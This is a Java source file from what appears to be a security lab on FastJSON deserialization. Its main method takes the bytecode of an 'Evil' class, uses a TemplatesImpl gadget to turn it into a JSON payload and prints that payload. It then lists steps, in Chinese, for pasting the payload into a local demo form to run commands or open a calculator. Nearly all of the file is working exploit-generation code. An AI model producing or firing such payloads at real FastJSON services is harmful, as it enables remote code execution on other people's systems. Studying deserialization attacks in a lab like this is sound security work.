package com.govuln.fastjsonattack;

import javassist.ClassPool;
import javassist.CtClass;

/**
 * FastJSON TemplatesImpl 攻击客户端
 * 生成基于 TemplatesImpl 的 payload
 */
public class Client {
    public static void main(String[] args) throws Exception {
        System.out.println("=== FastJSON TemplatesImpl Payload 生成器 ===\n");
        
        // 获取恶意类的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(com.govuln.fastjsonattack.Evil.class.getName());
        byte[] clazzBytes = clazz.toBytecode();
        
        // 生成 payload
        FastJSONTemplatesImpl gadget = new FastJSONTemplatesImpl();
        String payload = gadget.getPayloadSimple(clazzBytes);
        
        System.out.println("生成的 Payload：");
        System.out.println(payload);
        System.out.println("\n重要提示：");
        System.out.println("✅  TemplatesImpl 方式推荐使用（不依赖 JNDI，更可靠）");
        System.out.println("⚠️  此 payload 需要服务端开启 Feature.SupportNonPublicField（已开启）");
        System.out.println("⚠️  如果 JdbcRowSetImpl 失败（ClassCastException），请使用此方式");
        System.out.println("\n使用方法：");
        System.out.println("1. 确保 fastjsondemo 已重新编译并部署（已开启 SupportNonPublicField）");
        System.out.println("2. 将上面的 JSON 数据复制");
        System.out.println("3. 访问 http://localhost:8080/fastjsondemo/");
        System.out.println("4. 在表单中粘贴 JSON 数据并提交");
        System.out.println("5. 如果成功，会弹出计算器（Windows）或执行命令（Linux）");
        System.out.println("\n如果仍然失败，请查看 fastjsonattack/问题说明.md");
        System.out.println("如果 JdbcRowSetImpl 失败，请查看 fastjsonattack/JdbcRowSetImpl最终解决方案.md");
    }
}

